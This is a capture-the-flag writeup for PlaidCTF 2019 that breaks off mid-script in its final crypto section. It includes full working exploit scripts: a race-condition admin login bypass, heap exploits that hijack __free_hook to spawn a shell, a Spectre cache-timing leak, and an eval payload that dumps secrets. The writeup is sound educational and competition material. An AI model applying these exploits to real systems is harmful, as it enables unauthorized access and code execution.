# PlaidCTF 2019

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20190413-plaidctf/) of this writeup.**


 - [PlaidCTF 2019](#plaidctf-2019)
   - [Misc](#misc)
     - [Sanity Check](#sanity-check)
     - [docker](#docker)
     - [Everland](#everland)
     - [can you guess me](#can-you-guess-me)
     - [Space Saver](#space-saver)
     - [A Whaley Good Joke](#a-whaley-good-joke)
     - [Project Eulernt](#project-eulernt)
   - [Reversing](#reversing)
     - [The .WAT ness](#the-wat-ness)
     - [Plaid Party Planning III](#plaid-party-planning-iii)
     - [big maffs](#big-maffs)
       - [TL;DR](#tldr)
     - [i can count](#i-can-count)
   - [Web](#web)
     - [Triggered](#triggered)
   - [Pwnable](#pwnable)
     - [SPlaid Birch](#splaid-birch)
     - [Spectre](#spectre)
     - [Suffarring](#suffarring)
     - [cppp](#cppp)
       - [Vulnerability](#vulnerability)
       - [Exploitation](#exploitation)
   - [Crypto](#crypto)
     - [SPlaid Cypress](#splaid-cypress)
       - [TL;DR](#tldr-1)
     - [Horst](#horst)
     - [R u SAd?](#r-u-sad)


## Misc
### Sanity Check
`PCTF{welcome to PlaidCTF}`
### docker

- `docker pull whowouldeverguessthis/public`
- `grep -R 'PCTF' /var/lib/docker/`
- `PCTF{well_it_isnt_many_points_what_did_you_expect}`


### Everland
According to `capture move`, it will capture the enemy and do `play_game` with the next enemy.

```sml
    if (!should_capture) andalso (not (!has_captured)) 
    then
      if (!e_h > 50) then
        (TextIO.print ("It was too strong, you failed to capture "^
          (color e_name ORANGE));
        enemy)
      else
      let
        val _ = should_capture := false
        val _ = has_captured := true
        val _ = captured := enemy
        (* Kill them so that you can heal yourself *)
        fun sacrifice_fn (my_h, my_s, their_h, their_s) =
          (fn () => (
             my_h := min((!my_h)+min(!e_h, !my_s*10), player_max);
             e_h  := (!e_h-(!my_h)*10);
             
             p_ms := List.filter (fn (n, _) => n <> "Sacrifice") (!p_ms)),
           fn () => ()) (* Only used by the AI, not us *)
        val _ = p_ms := (List.filter (fn (n, _) => n <> "Capture") (!p_ms))
                        @[("Sacrifice", sacrifice_fn)]
      in
        next
      end

```
In the end, `find_best` will chose the enemy wich has the maximum strength amoung all enemies, and make the enemy chosen become `Posessed enemy`.

```sml
fun find_best (this as (Opponent (_, my_s, _, _, next))) best entity =
  if (!my_s) > best then find_best next (!my_s) this
                    else find_best next best entity
  | find_best _ _ entity = entity

```
If we can capture the enemy with max strength, we can de `sacrifice_fn` of it, then kill the posessed enemy.

```python
#!/usr/bin/env python
from pwn import *

# PCTF{just_be_glad_i_didnt_arm_cpt_hook_with_GADTs}

host , port = 'everland.pwni.ng' , 7772
y = remote( host , port )


def sp( p ):
    y.sendlineafter( '>' , p )

y.sendlineafter( '?' , 'yuawn' )

for _ in range( 5 ):
   sp( 'forage' )

sp( 'use' )
sp( '1' )

sp( 'use' )
sp( '3' )

for _ in range( 3 ):
    sp( 'fight' )
    sp( '2' )

sp( 'fight' )
sp( '4' )

sp( 'fight' )
sp( '4' )
for j in range( 9 ):
    sp( 'fight' )
    sp( '2' )

for i in range( 8 ):
    sp( 'fight' )
    sp( '4' )
    for j in range( 7 ):
        sp( 'fight' )
        sp( '2' )


sp( 'fight' )
sp( '5' )

y.interactive()

```
### can you guess me

```python
#! /usr/bin/env python3

from sys import exit
from secret import secret_value_for_password, flag, exec

try:
    val = 0
    inp = input("Input value: ")
    count_digits = len(set(inp))
    if count_digits <= 10:          # Make sure it is a number
        val = eval(inp)
    else:
        raise

    if val == secret_value_for_password:
        print(flag)
    else:
        print("Nope. Better luck next time.")
except:
    print("Nope. No hacking.")
    exit(1)

```
Just print the python values: `print(vars())`, the payload satisfy the limitation of numbers of set.

```
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__':
<_frozen_importlib_external.SourceFileLoader object at 0x7f5008e579e8>, 
'__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>,
'__file__': '/home/guessme/can-you-guess-me.py', '__cached__': 
None, 'exit': <built-in function exit>, 
'secret_value_for_password': 'not even a number; this is a damn string; and it has all 26 characters of the alphabet; abcdefghijklmnopqrstuvwxyz; lol', 
'flag': 'PCTF{hmm_so_you_were_Able_2_g0lf_it_down?_Here_have_a_flag}', 
'exec': <function exec at 0x7f5008da0158>, 
'val': 0, 'inp': 'print(vars())', 'count_digits': 10}

```
* `PCTF{hmm_so_you_were_Able_2_g0lf_it_down?_Here_have_a_flag}`

### Space Saver
We're given a disk image. By using binwalk, we know there are some pictures and an encypted rar file inside the image. After extracting those files, we use zsteg to examine those pictures, and found that they all contain some plaintext, which look pretty suspicious. After we concatenate those plaintext and treat it as the rar's password, we successfully decrypted and decompressed the rar file, which gave us the flag ( a png file ): `PCTF{2pac3_3v34ry_wh3r3}`.

### A Whaley Good Joke
The challenge is a tar.gz compressed file. After we decompressed it, we found there were many folders, which all contains a json file and a `layer.tar` file.

By checking the `repositories` text file, we know that the latest layer is in the folder `24d12bbeb0a9fd321a8decc0c544f84bf1f6fc2fd69fa043602e012e3ee6558b`. By decompressing the `layer.tar` in that folder, we found a `flag.sh`:


```bash
for i in {1..32}
do
    test -f $i
    if [[ $? -ne 0 ]]
    then
        echo "Missing file $i - no flag for you!"
        exit
    fi
done

echo pctf{1_b3t$(cat 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32)}

```

So we can see that there should be 32 files ( which contains a single character in each file ) after we decompress all the `layer.tar` in each folders. Also by examine the json file in each folder, we can infer the relationship between each layer ( some of them doesn't contain the info though, we'll have to guess ). 

After we decompressed all the `layer.tar`, get all the required files and put those characters together ( require some guessing ), we finally got the flag: `pctf{1_b3t_u_couldnt_c0nt4in3r_ur_l4ught3r}`





### Project Eulernt
We need to search a integer x so that 
1. 333! % x == 0
2. x is close enough to $\sqrt{333!}$

We start with $x = 188!$, and keep making $\sqrt{333!} / x$ closer to 1.

```python=
#!/usr/bin/python
import gmpy2
from gmpy2 import mpz

def factors(n):
    result = set()
    n = mpz(n)
    for i in range(1, gmpy2.isqrt(n) + 1):
        div, mod = divmod(n, i)
        if not mod:
            result |= {mpz(i), div}
    return result

n = gmpy2.fac(333)
y = int(gmpy2.isqrt(n))

start = int(gmpy2.fac(188))
# start * 11.99..... == y
start *= 12
# we keep searching z so that (y / (start * x)) become closer to 1.
# the goal is int((y / (start * x)) * 1e8) == 100000000

start //= 10000000000
# now we search x from int(y / (start))

x = int(y / (start))
while 1:
    # We run two script simultaneously
    # one is x += 1, while the other is x -= 1
    x -= 1
    ret = list(factors(x))
    ans = []
    sign = 1
    for i in ret:
        if gmpy2.is_prime(i):
            ans.append(i)
            if i > 333:
                sign = 0
                break

    if sign and n % (start * x) == 0:
        print ('x : ', x)
        print ('ans : ', start * x)
        exit()

```
## Reversing
### The .WAT ness
This challenge probably inspired by the game [The Witness](https://en.wikipedia.org/wiki/The_Witness_(2016_video_game)).
It's a puzzle game, you have to solve 5 rounds within certain time limit in order to get the flag.

![Puzzle preview](https://i.imgur.com/gXbm60B.png)

You may notice the server request a webasm. This webasm will do all the constraints checking for the puzzle. However, I didn't take much time on reversing the webasm because I think it will be much more easier for me to figure the rules out by playing numerous of times. xD

There are 6 types of constraints:
1. Circle - Different color circle should not be in the same region.
2. Double Circle - One region can only have one pair of same color circle/double circle.
3. Tetris block (yellow) - The region must fit that kind of tetris block.
4. Edge block (teal) - The number of edge you should passby for that block.
5. Triangle - ~~Must passby the bottom edge of the block (maybe?).~~ After asking 217, (passby edge + 2) % 3 + 1 = number of triangle in a region.
6. Rectangle - Can't passby the edge of the block.

P/S: The BGM made me crazy! >:(

`pctf{what_if_i_made_firmament_instead}`

### Plaid Party Planning III
The binary simulates 15 people having a meal together. Each thread represents one person, and each person has their own style (the order of grabbing/putting back the food).
There are 15 different seats, and you can only take the (five, to be precise) food near your seat.
The goal is to give a seat order so that deadlock will not happen.

However, in this challenge, just patch the binary [0x180b:0x18e7] to `nop`, then you will get the flag. (The author released a new challenge for the fixed version after that.)

`PCTF{1 l1v3 1n th3 1nt3rs3ct1on of CSP and s3cur1ty and parti3s!}`

### big maffs
[Detailed writeup](https://sasdf.cf/ctf/writeup/2019/plaid/rev/bigmaffs/)

#### TL;DR
1. Reverse the binary
2. Find a isomorphism between that strange numeral system and Z (Integer Group).
3. Calculate modular Ackermann function.
4. Reduce the exponent using euler's totient.

It's a binary that will calculate the flag.
But it needs enormous memory and time.

It use a strange numeral system, and we figure out that it can be transform into 256-based integer with a pre-generated mapping of 0-256.

After that we found that the binary is calculating Ackermann function mod some integer.

So all we need to do is calculate that value with some horrible number theory blackmagic.
If you are a pure reversing guy, you may want to skip this.
Otherwise, see our [detailed writeup here](https://sasdf.cf/ctf/writeup/2019/plaid/rev/bigmaffs/).


### i can count

## Web
### Triggered

This challenge give us a plpgsql microservice.

Our request, response, cookie, session will be processed with plpgsql.

The plpgsql source code is in http://triggered.pwni.ng:52856/static/schema.sql

And the vulnerability is under the login trigger/ function:


```sql
CREATE TABLE web.session (
  uid uuid PRIMARY KEY DEFAULT uuid_generate_v4(),
  user_uid uuid,
  logged_in boolean NOT NULL DEFAULT FALSE
);


---------- POST /login

CREATE FUNCTION web.handle_post_login() RETURNS TRIGGER AS $$
DECLARE
  form_username text;
  session_uid uuid;
  form_user_uid uuid;
  context jsonb;
BEGIN
  SELECT
    web.get_form(NEW.uid, 'username')
  INTO form_username;

  SELECT
    web.get_cookie(NEW.uid, 'session')::uuid
  INTO session_uid;

  SELECT
    uid
  FROM
    web.user
  WHERE
    username = form_username
  INTO form_user_uid;

  IF form_user_uid IS NOT NULL
  THEN
    INSERT INTO web.session (
      uid,
      user_uid,
      logged_in
    ) VALUES (
      COALESCE(session_uid, uuid_generate_v4()),
      form_user_uid,
      FALSE
    )
    ON CONFLICT (uid)
      DO UPDATE
      SET
        user_uid = form_user_uid,
        logged_in = FALSE
    RETURNING uid
    INTO session_uid;

    PERFORM web.set_cookie(NEW.uid, 'session', session_uid::text);
    PERFORM web.respond_with_redirect(NEW.uid, '/login/password');
  ELSE
    PERFORM web.respond_with_redirect(NEW.uid, '/login');
  END IF;

  RETURN NEW;
END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER route_post_login
  BEFORE INSERT
  ON web.request
  FOR EACH ROW
  WHEN (NEW.path = '/login' AND NEW.method = 'POST')
  EXECUTE PROCEDURE web.handle_post_login();

  ---------- POST /login/password

CREATE FUNCTION web.handle_post_login_password() RETURNS TRIGGER AS $$
DECLARE
  form_password text;
  session_uid uuid;
  success boolean;
BEGIN
  SELECT
    web.get_cookie(NEW.uid, 'session')::uuid
  INTO session_uid;

  IF session_uid IS NULL
  THEN
    PERFORM web.respond_with_redirect(NEW.uid, '/login');
    RETURN NEW;
  END IF;

  SELECT
    web.get_form(NEW.uid, 'password')
  INTO form_password;

  IF form_password IS NULL
  THEN
    PERFORM web.respond_with_redirect(NEW.uid, '/login/password');
    RETURN NEW;
  END IF;

  SELECT EXISTS (
    SELECT
      *
    FROM
      web.user usr
        INNER JOIN web.session session
          ON usr.uid = session.user_uid
    WHERE
      session.uid = session_uid
        AND usr.password_hash = crypt(form_password, usr.password_hash)
  )
  INTO success;

  IF success
  THEN
    UPDATE web.session
    SET
      logged_in = TRUE
    WHERE
      uid = session_uid;

    PERFORM web.respond_with_redirect(NEW.uid, '/');
  ELSE
    PERFORM web.respond_with_redirect(NEW.uid, '/login/password');
  END IF;

  RETURN NEW;
END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER route_post_login_password
  BEFORE INSERT
  ON web.request
  FOR EACH ROW
  WHEN (NEW.path = '/login/password' AND NEW.method = 'POST')
  EXECUTE PROCEDURE web.handle_post_login_password();

```

There is a **Race Condition** vulnerability.

login process:

1. `POST /login` set a uuid to the session and bind user with our input `username`
2. `POST /login/password` find the user password in db with corresponding uuid in the session, and compare with our input `password`
3. if two passwords are the same, it will update `logged_in=TRUE`

if we run step 1 between step 2 and step 3, we can change our user to arbitrary user and pass the password authentication.


exploit:


```python
'''
1. LOGIN as kaibro
2. POST /login with same `session` cookie but different username
'''

import threading
import time
import requests

host = "http://triggered.pwni.ng:52856"

def init(user, sess):
    r = requests.get(host + "/logout", cookies={"session":sess})
    setuser(user, sess)

def setuser(user, sess):
    r = requests.post(host + "/login", data={"username": user}, cookies={"session":sess})
    #print(r.headers)
    #print(r.text)

def login(pwd, sess):
    r = requests.post(host + "/login/password", data={"password": pwd}, cookies={"session": sess})
    print(r.headers)
    print(r.text)
    if "admin" in r.text:
        print("Fuckkkkkkk!")


sess = "d505bb4f-343e-47e1-a589-aacb3a4f85c3"
user = "kaibro"
target = "admin"
pwd = "kaibro"

#login(pwd, sess)
#setuser(target, sess)


init(user, sess)
time.sleep(1)

def job():
    login(pwd, sess)
    time.sleep(1)

t = threading.Thread(target = job)

t.start()

setuser(target, sess)
time.sleep(1)

t.join()

print("Done.")


```

if we login as admin, we can find out the flag:

![](https://i.imgur.com/7U7tbUd.png)




## Pwnable
### SPlaid Birch

* SP_select can let us select a SP and show its value, but this function contains out-of-bound vulnerability.
* We can add two SPs and trigger the vulnerability to leak heap address.
* Create unsortbin.
* Fake a SP_struct pointer on heap and let the value points to the unsortbin, so that we can trigger the vulnerability to leak libc address contained in the unsortbin.
* Fake a SP_struct pointer on heap and let the value points to free_hook, so that we can trigger the vulnerability to modify free_hook to system using sp_isolate2.
* Conduct sp_add(0x6873,0x6873) twice to trigger free_hook('sh').

flag : `PCTF{7r335_0n_h34p5_0n_7r335_0n_5l3470r}`

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
host = 'splaid-birch.pwni.ng'
port = 17579

binary = "./splaid-birch"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("./libc.so.6")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")

def sp_del(index):
  r.sendline("1")
  r.sendline(str(index))
  pass

def sp_get(index):
  r.sendline("2")
  r.sendline(str(index))
  pass

def sp_nth(index):
  r.sendline("3")
  r.sendline(str(index))
  pass

def sp_select(index):
  r.sendline("4")
  r.sendline(str(index))

def sp_add(index,data):
  r.sendline("5")
  r.sendline(str(index))
  r.sendline(str(data))

def sp_isolate(index,data):
  r.sendline("6")
  r.sendline(str(index))
  r.sendline(str(data))

def sp_isolate2(index,data1,data2):
  r.sendline("7")
  r.sendline(str(index))
  r.sendline(str(data1))
  r.sendline(str(data2))

if len(sys.argv) == 1:
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})

else:
  r = remote(host ,port)

if __name__ == '__main__':
  sp_add(0x11,0)
  sp_add(0x12,0)
  sp_select(531)
  heap = int(r.recvline()) - 0x12f8
  print("heap = {}".format(hex(heap)))
  sp_select(0)
  r.recvline()
  sp_add(0x13,0)
  sp_add(0x14,0)
  sp_add(0x1,0)
  sp_add(0 ,heap+0x30b0)
  for i in xrange(155):
    sp_add(0x20+i ,0)
  sp_select(-1865)
  libc = int(r.recvline()) - 0x3ebca0
  print("libc = {}".format(hex(libc)))
  sp_select(0)
  r.recvline()
  free_hook = 0x3ed8e8 + libc
  realloc_hook = 0x3ebc28 + libc
  malloc_hook = 0x3ebc30 + libc

  sp_add(0x200,(-((heap+0x1500)*2))&0xffffffffffffffff)
  sp_add(0x201,0)
  sp_add(0x202,free_hook-0x18)
  sp_isolate2(free_hook-0x18,0,0x202)
  magic = libc + 0x4f322
  magic = libc + 0x10a38c
  system = libc + 0x00000000004f440

  sp_select(-941)
  sp_isolate2(system,0,-941)

  sp_add(0x6873,0x6873)
  sp_add(0x6873,0x6873)
  r.recvline()
  r.sendline("ls")

  r.interactive()


```
### Spectre
According to [spectre-attack-exploit](https://github.com/Eugnis/spectre-attack), we know there must be a buffer[256 * 512] for testing access time. First, assign buffer[i * 512] for each i to prevent copy on write zero page problem, and flush out it from cache line. 

However, we do not have 
```clflush
``` can be used, but there are 32MB space we can use.
Usually, L3 Cache size is 8MB, so we can flush out the buffer from by accessing the other space which is far away from buffer.

Second, here is 
```builtin_bc
```.

```c
signed __int64 __fastcall builtin_bc(unsigned __int64 a1)
{
  signed __int64 result; 

  result = -1LL;
  if ( *(_QWORD *)the_vm > a1 )
    result = *(unsigned __int8 *)(the_vm + a1 + 8);
  return result;
}

```
We can use it for training speculative execution, pass argument with 
```0 0 0 0x1018
``` sequentially. CPU do speculative execution and leak the value of 
```the_vm+0x1018+8
``` by following flow.


```c
a = builtin_bc(0x1018)
buffer[a*512] = 1

```

Then, just using 
```builtin_time
``` to get the access time of buffer and store it in output memory region. Analyze it and known which is spectre.

#### Exploitation

```python
from pwn import *
import random

r = process(["./spectre","flag"])

def combine(a,b):
    return p8(((b&7)<<3)+(a&7))

def Epilogue():
    return p8(0)
def Cdq(reg_dst, reg_src32d):
    return p8(1)+combine(reg_dst, reg_src32d)
def Add(reg_dst, reg_src):
    return p8(2)+combine(reg_dst, reg_src)
def Sub(reg_dst, reg_src):
    return p8(3)+combine(reg_dst, reg_src)
def And(reg_dst, reg_src):
    return p8(4)+combine(reg_dst, reg_src)
def Shl(reg_dst, reg_src):
    return p8(5)+combine(reg_dst, reg_src)
def Shr(reg_dst, reg_src):
    return p8(6)+combine(reg_dst, reg_src)
def Mov(reg_dst, reg_src):
    return p8(7)+combine(reg_dst, reg_src)
def Movc(reg_dst, const32):
    return p8(8)+p8(reg_dst)+p32(const32)
def Load(reg_dst, mem_src):
    return p8(9)+combine(reg_dst, mem_src)
def Store(mem_dst, reg_src):
    return p8(10)+combine(mem_dst, reg_src)
def Builtin(reg_dst, func_num):
    return p8(11)+combine(reg_dst, func_num)
def Loop(reg, times, dest):
    return p8(12)+p8((reg&7)<<3)+p32(times)+p32(dest)


def access_init(target):
    return Movc(0, target) + Movc(5, 512)

def access_body(val):
    return Movc(6,val) + Store(0, 6) + Add(0, 5)

def train_init():
    return Movc(1, array2)

def train_body():
    ret = ''

    # Training part
    for i in range(3):
        ret += Movc(0, 0x61) + Builtin(0, 0) + Movc(2, 9) + Shl(0, 2) + Add(0, 1) + Load(5, 0)

    # Access which byte we want to leak
    ret += Movc(0, 0x1019+2) + Builtin(0, 0) + Movc(2, 9) + Shl(0, 2) + Add(0, 1) + Load(5, 0)
    return ret

def test_time_init():
    return Movc(5, 0)

def test_time_body():
	ret = Movc(3, 0) + Movc(2,1) + Movc(1,0)
	ret += Add(1,5) + Add(3,2) + Loop(3, 166, len(code)+len(ret))
	ret += Movc(3,13) + Add(1,3) + Movc(3,255) + And(1,3) + Mov(4,1) + Movc(6,9) + Shl(1,6) + Movc(6,array2) + Add(6,1)
	ret += Builtin(1, 1) + Load(0, 6) + Builtin(0, 1) + Sub(0, 1)
	ret += Movc(3,3) + Shl(4,3) + Add(4, 7) + Store(4,0) + Movc(3,1) + Add(5,3)
	return ret

def get_loop(reg, cond, val):
    return Loop(reg, cond, val);


array2 = 0x1800000
flush_use = 0x800000

code = ''

code += Movc(7,0)

# array2 is use to verify cache hit
# Fist assign prevent copy on write zero page
code += access_init(array2)
code += access_body(0x1) + get_loop(0, array2+0x7fff00, len(code))

code1 = code

# Flush out cache by accessing other mem
for i in range(100):
    code += access_init(flush_use)
    code += access_body(i) + get_loop(0, flush_use+0xffff00, len(code))

# training speculative execution
code += Movc(6,0)
code += (train_init() + train_body()) + Movc(5,1) + Add(6,5) + Loop(6,50-1,len(code))

# Test access time with array2[i*512] for i in range(256)
code += test_time_init()
code += test_time_body() + get_loop(5, 255, len(code))

code += Movc(6, 2048) + Add(7, 6) + get_loop(7, 0x800, len(code1))
code += Epilogue()

payload = p64(len(code))+code

# output bytecodes
with open("code","w") as file:
    file.write(payload)

# analyze output
r.send(payload)
data = r.recvall()
for i in range(0, 0x1000, 8):
    if(u64(data[i:i+8]) < 80):
        print(chr( (i/8 ) % 256), u64(data[i:i+8]))


r.interactive()

```

### Suffarring
* There is a heap overflow at Recant Function when needle length is larger than haystack
* Overwrite the size to leak libc and heap address
* Overwrite the tcache's fd to malloc at __free_hook
* Modify __free_hook to system and get shell


```python=
from pwn import *

#r = process(["./suffarring"])
r = remote("suffarring.pwni.ng", 7361)

def add(size,data):
    r.sendlineafter(">","A")
    r.sendlineafter("?",str(size))
    r.sendafter("?",data)

def recant(idx,size,data):
    r.sendlineafter(">","R")
    r.sendlineafter("?",str(idx))
    r.sendlineafter("?",str(size))
    r.sendafter("?",data)


def remove(idx):
    r.sendlineafter(">","D")
    r.sendlineafter("?",str(idx))

def Print(idx):
    r.sendlineafter(">","P")
    r.sendlineafter("?",str(idx))

context.arch = "amd64"
add(0x4,"a"*0x4)
remove(0)
add(0x20,'a'*0x20)
add(0x30,'a'*0x30)
add(0x28,flat(0,0,0,0x31,0x630))
recant(2,0x30,flat(0,0,0,0x31,0x630)+p64(0x151))

add(0x500,'a'*0x500)
add(1,"a")
remove(3)
Print(2)
r.recvuntil("> ")
r.recvn(0x430)
heap = u64(r.recvn(0x8)) - 0x26a0
r.recvn(0x1f0)
libc = u64(r.recvn(0x8)) - 0x3ebca0

print hex(heap)
print hex(libc)

add(0x4,"a"*0x4)
remove(3)
add(0x4,"a"*0x4)
remove(3)
add(0x30,'a'*0x30)

data = flat(0,0,0,0x31,0,0,0,0,0,0x31,
        0,0,0,0,0,0x31,
   0x0,0,0,0,0,0x31,
   libc+0x3ed8e8,0,0,0,0,0x31,
    0x120,0,0,0,0,0x31,)
data += p64(len(data)+0x10)
add(len(data),data)
recant(5,len(data)+8,data+p64(0x8d1))
add(0x3,"sh\x00")
add(0x20,p64(libc+0x4f440)+p64(0)*3)

remove(6)

r.interactive()


```
### cppp
The service is written in C++, which allow us to add/remove/view a data. Each data will be appended to a vector, and can be removed/viewed by providing the index of the data.

#### Vulnerability
After playing around with the service, we found that

```
add(name, data) // data size = 0x20
add(name, data)
remove(0)
view(0)

```
will leak the heap address. Also 

```
add(name, data) // data size = 0x20
add(name, data)
remove(0)
remove(0)

```
will make tcache_entry[0] ( chunk size 0x20 )  contains duplicate memory chunks, which allow us to use tcache poisoning to achieve arbitrary write primitive.

#### Exploitation
First we leak the heap address. Then we allocate data ( size = 0x90 ) for 8 times, and free them all. This will make libc address appears on the heap memory, so later we can leak it with arbitrary read primitive.

To achieve arbitrary read, we use tcache poisoning to overwrite the fd pointer of the tcache entry and let it point to the beginning of the data vector. Next time when we add a data with size 0x200, we'll be able to control the content ( including the data pointer ) of the data vector. With a fake data vector, we can leak the libc address by viewing the data we forged inside the vector. 

After that, just use tcache poisoning again to overwrite the tcache entry's fd pointer to `__free_hook`, then overwrite the function pointer to `system` and call `free('sh')` ( now `system('sh')` ) to get the shell and the flag.

Final exploit script:

```python
#!/usr/bin/env python

from pwn import *

elf = ELF("./cppp_noalarm")
libc = ELF("./libc-2.27_50390b2ae8aaa73c47745040f54e602f.so")

def add(name, buf):
    r.sendlineafter(":", "1")
    r.sendlineafter("name:", name)
    r.sendlineafter("buf:", buf)

def remove(idx):
    r.sendlineafter(":", "2")
    r.sendlineafter("idx:", str(idx))

def view(idx):
    r.sendlineafter(":", "3")
    r.sendlineafter("idx:", str(idx))

if __name__ == "__main__":

    r = remote("cppp.pwni.ng", 4444)

    # leak heap
    add("1111", "a"*0x200)
    add("2222", "b"*0x200)
    remove(0)
    view(0)
    r.recvuntil(" ")
    heap = u64(r.recv(6).ljust(8, "\x00")) - 0x13290 - 0xc30 
    log.success("heap: {:#x}".format(heap))

    remove(0) # duplicate tcache 0x210

    # make libc address appears on heap
    for i in xrange(3, 11): # allocate 0x90 * 8
        log.info("alloc 0x90:{}".format(i))
        c = chr(ord('a') + i)
        add(str(i)*4, c*0x80)

    for i in xrange(7, 1, -1): # free 0x90*8
        log.info("del 0x90:{}".format(i))
        remove(i)

    # next allocate 0x210 from tcache ( overwrite fd )
    vector_begin = heap + 0x146f0
    payload = p64(vector_begin).ljust(0x200, 'z')
    add("1111", payload)
    # fake vector
    libc_ptr = heap + 0x149a0
    tcache20 = heap + 0x14750
    payload = "i"*8 + p64(libc_ptr) + p64(libc_ptr) + p64(8) + "i"*16 # idx 0
    payload += p64(8) + p64(tcache20) + p64(libc_ptr) + p64(8) + p64(0) + p64(0x21) # idx 1
    payload += p64(8) + p64(tcache20) + p64(libc_ptr) + p64(0x21) + p64(0) + p64(21) # idx 2
    payload = payload.ljust(0x200, "\x00")
    add(p64(heap+0x50), payload)
    # leak libc
    view(0)
    r.recvuntil(" ")
    libc.address = u64(r.recv(6).ljust(8, "\x00")) - 0x3ebca0
    log.success("libc.address: {:#x}".format(libc.address))
    # make tcache 0x20 duplicate
    add("1", "sh\x00")
    add("2", "sh\x00")
    remove(0)
    remove(0)
    # overwrite __free_hook to system
    add("4", p64(libc.symbols.__free_hook))
    add("5", p64(libc.symbols.system))
    # will call free("sh")
    add("6", "sh".ljust(0x68, "\x00"))
    r.interactive()

```
flag: `PCTF{ccccccppppppppppppPPPPP+++++!}`



## Crypto
### SPlaid Cypress
#### TL;DR
1. Find those known plaintext.
2. Count the mean and variance of output bit length at each position.
3. Reconstruct the splay tree from the end.
4. Recover central directory file header.
5. Reconstruct local file header based on central directory file header.
6. Reconstruct the initial splay tree.
7. Decrypt the zip and enjoy the flag.

The writeup is quite long, you can read it [here](https://sasdf.cf/ctf/writeup/2019/plaid/crypto/cypress/).
Briefly, It tooks me a lot of time find features to segment the bitstream, and find a way to generate plaintext similar to the secret.

### Horst
We are given two files: the main script `horst.py`, used for encryption and decryption; `data.txt`, which includes two plaintext-ciphertext pairs. The encryption function is defined as follows:

```python
M = 3
...
def encrypt(m, k):
    x, y = m
    for i in range(M):
        x, y = (y, x * k.inv() * y * k)
    return x, y

```
where `x`, `y` are both permutations of the set `{1, 2, ..., 64}`. Our goal is to recover the key `k`. After some calculations (of 3 round encryption), we know that if the plaintext is `(x, y)`, then the ciphertext would be `(yk'xk'ykk, xk'yyk'xk'ykkk)`, where `k'` is `k.inv()`, as defined in the main script, the inverse of `k`.
Let `(x1, y1)`, `(c1, d1)` be the plaintext and ciphertext of the first pair, respectively. `(x2, y2)` and `(c2, d2)` follow the similar definitions. Notice that `d1d2' = x1k'y1c1c2'y2'kx2'` holds. Let `t = x1'd1d2'x2` and `b = y1c1c2'y2'`, we have `t = k'bk`, that is, `t` is a conjugate of `b` with respect to `k'`. According to [Theorem 2](http://mathonline.wikidot.com/conjugate-cycles), if we know the cycle notations of `b` and `t`, then we can construct `u` such that `t = ubu'`, and `u` will be a candidate of `k'`. Here is the exploit:

```python
# cycles of b
v1 = map(int, '0 53 9 62 2 36 59 25 39 58 34 41 63 30 21 49 16 3 52 37 57 10 40 8 5 55 24 4 17 29 32 31 27 19 6 7 47 51'.split())
v2 = map(int, '1 15 26 18 61 56 38 42 11 35 43 44 22 54 60 46 20 14 28 23 33 13 48 12 45 50'.split())

# cycles of t = k^-1 * b * k
w1 = map(int, '1 11 46 43 30 17 34 59 23 6 38 50 39 45 47 36 20 52 63 21 4 10 54 24 29 18 9 42 57 37 27 15 62 41 55 40 58 56'.split())
w2 = map(int, '0 61 16 48 31 25 49 3 51 12 28 26 8 7 13 44 2 35 60 53 5 32 33 14 22 19'.split())

for _ in range(len(v1)):
    for _ in range(len(v2)):
        k = [None] * N
        for i in range(len(v2)):
            k[v2[i]] = w2[i]
        for i in range(len(v1)):
            k[v1[i]] = w1[i]
        m = Permutation(k)
        if (x1, y1) == decrypt((c1, d1), m) and (x2, y2) == decrypt((c2, d2), m):
            print "The flag is: PCTF{%s}" % sha1(str(m)).hexdigest()
        v2 = [v2[-1]] + v2[:-1]
    v1 = [v1[-1]] + v1[:-1]

```
Flag: `PCTF{69f4153d282560cdaab05e14c9f1b7e0a5cc74d1}`

### R u SAd?
We are given three files: the main script `rusad`, which can generate an RSA key and use it to encrypt/decrypt files; an encrypted flag `flag.enc`; a public key `key.sad.pub`. We first examine the public key:

```python
>>> key = pickle.load(open('key.sad.pub', 'rb'))
>>> dir(key)
['E', 'N', 'PRIVATE_INFO', ..., 'bits', 'iPmQ', 'iQmP', 'ispriv', 'ispub', 'priv', 'pub']

```
`iQmP` and `iPmQ` are variables used for decryption, and they haven't been deleted when the public key is exported. From the source code, the two variables are defined as follows:

```python
def egcd(a1, a2):
        x1, x2 = 1, 0
        y1, y2 = 0, 1
        while a2:
                q = a1 // a2
                a1, a2 = a2, a1 - q * a2
                x1, x2 = x2, x1 - q * x2
                y1, y2 = y2, y1 - q * y2
        return (x1, y1, a1)

def genkey(bits):
    ...
    iQmP, iPmQ, _ = egcd(q, p)
    return Key(
        N=p*q, P=p, Q=q, E=e, D=d%((p-1)*(q-1)), DmP1=d%(p-1), DmQ1=d%(q-1),
        iQmP=iQmP%p, iPmQ=iPmQ%q, bits=bits,
    )

```
where `p` and `q` are both 2048-bit primes. Let `a1, a2, _ = egcd(q, p)`, and thus, `a1 * q + a2 * p = 1`. Note that `-p < a1 < p`, `-q < a2 < q` and `a1 * a2 < 0`. It implies that `(iQmP, iPmQ)` has two possibilities: `(a1, a2 + q)` or `(a1 + p, a2)`.

Now consider the equation `c1 * iQmP + c2 * iPmQ = n + 1`, where `n = p * q`. We know that `(c1, c2) = (q, p)` is a solution in both cases of `(iPmQ, iQmP)`. Thus, the general solution of the equation is `(q + k * iPmQ, p - k * iQmP)`, where `k` is an integer. To find `q`, we could first find a solution `(d1, d2)`. Since `d1 = q + k' * iPmQ` for some `k'`, we search for `q` by adding (or subtracting) a multiple of `iPmQ` from `d1`. Exploit:


```python
t1, t2, g = egcd(key.iQmP, key.iPmQ)
# g = 1
d1, d2 = (key.N+1)*t1, (key.N+1)*t2
k = (d1-(1<<2048))//key.iPmQ
